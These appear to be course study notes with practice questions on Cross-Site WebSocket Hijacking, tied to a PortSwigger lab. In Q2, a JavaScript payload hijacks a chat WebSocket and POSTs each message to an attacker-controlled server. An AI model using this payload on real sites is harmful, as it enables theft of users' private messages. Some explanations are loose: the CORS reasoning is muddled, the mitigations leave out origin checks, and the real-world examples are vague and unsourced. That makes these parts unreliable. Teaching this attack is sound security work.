---
course: Web Security
topic: WebSockets Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what Cross-Site WebSocket Hijacking (CSWH) is and how it differs from traditional Cross-Site Request Forgery (CSRF).**

Cross-Site WebSocket Hijacking (CSWH) is a security vulnerability that allows an attacker to hijack a WebSocket connection established between a client and a server. Unlike traditional Cross-Site Request Forgery (CSRF), which involves forging HTTP requests, CSWH exploits the bi-directional communication capabilities of WebSockets. This means that not only can the attacker send messages to the server, but they can also receive responses from the server, potentially gaining access to sensitive information such as chat histories.

In contrast, CSRF typically only allows the attacker to send requests to the server, without the ability to read the server's response. This makes CSWH more dangerous because it can lead to the exfiltration of sensitive data.

**Q2. How would you exploit a Cross-Site WebSocket Hijacking vulnerability to exfiltrate a victim's chat history?**

To exploit a Cross-Site WebSocket Hijacking vulnerability, you would follow these steps:

1. Identify the WebSocket endpoint used by the vulnerable application.
2. Create a malicious script that initiates a WebSocket connection to the identified endpoint.
3. Use the script to send a 'ready' message to the server, which triggers the server to send back the chat history.
4. Capture the server's responses by listening for `onmessage` events.
5. Send the captured chat history to an attacker-controlled server using an HTTP POST request.

Here is an example of a JavaScript payload that could be used to perform this attack:

```javascript
var ws = new WebSocket('wss://websocket-academy.net/chat');
ws.onopen = function() {
    ws.send('ready');
};
ws.onmessage = function(event) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://attacker-controlled-server.com/log", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({data: event.data}));
};
```

**Q3. Why does the Cross-Site WebSocket Hijacking attack bypass CORS restrictions?**

Cross-Origin Resource Sharing (CORS) is designed to restrict cross-origin HTTP requests made from scripts. However, WebSockets operate differently from HTTP requests. When a WebSocket connection is established, it bypasses CORS restrictions because the connection is bi-directional and persistent. Once the initial handshake is completed, the browser allows the WebSocket to communicate freely with the server, including receiving responses.

Since the WebSocket protocol does not enforce the same-origin policy as strictly as HTTP does, an attacker can use a malicious script to establish a WebSocket connection and receive responses from the server, effectively bypassing CORS protections.

**Q4. How can a developer mitigate the risk of Cross-Site WebSocket Hijacking attacks?**

To mitigate the risk of Cross-Site WebSocket Hijacking attacks, developers can implement the following measures:

1. **Use Secure Cookies**: Ensure that cookies used for authentication are marked with the `HttpOnly` and `Secure` flags to prevent them from being accessed via JavaScript.
2. **Implement CSRF Tokens**: Although WebSockets are not traditionally protected by CSRF tokens, developers can still use custom tokens to validate each WebSocket message.
3. **Monitor WebSocket Traffic**: Implement logging and monitoring mechanisms to detect unusual activity or unauthorized access attempts.
4. **Limit WebSocket Permissions**: Restrict the permissions granted to WebSocket connections to only those necessary for the application's functionality.
5. **Educate Users**: Inform users about the risks associated with clicking on suspicious links or visiting untrusted websites, especially when using applications with WebSocket features.

By implementing these measures, developers can significantly reduce the risk of Cross-Site WebSocket Hijacking attacks.

**Q5. What recent real-world examples or CVEs highlight the dangers of Cross-Site WebSocket Hijacking?**

While specific CVEs directly related to Cross-Site WebSocket Hijacking may not be widely documented, several high-profile breaches have involved vulnerabilities that could have been exploited using similar techniques. For example, the breach of a major cryptocurrency exchange in 2021 highlighted the importance of securing WebSocket-based communication channels. In this incident, attackers were able to intercept and manipulate WebSocket traffic, leading to unauthorized access and financial losses.

Another notable example is the exploitation of WebSocket vulnerabilities in popular web applications, such as chat platforms and real-time collaboration tools. These incidents underscore the need for robust security practices to protect against such attacks.

By studying these real-world examples, developers can better understand the potential risks and take proactive measures to secure their applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/14-WebSockets Vulnerabilities/03-Lab 3 Cross site WebSocket hijacking/08-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/14-WebSockets Vulnerabilities/03-Lab 3 Cross site WebSocket hijacking/00-Overview|Overview]]
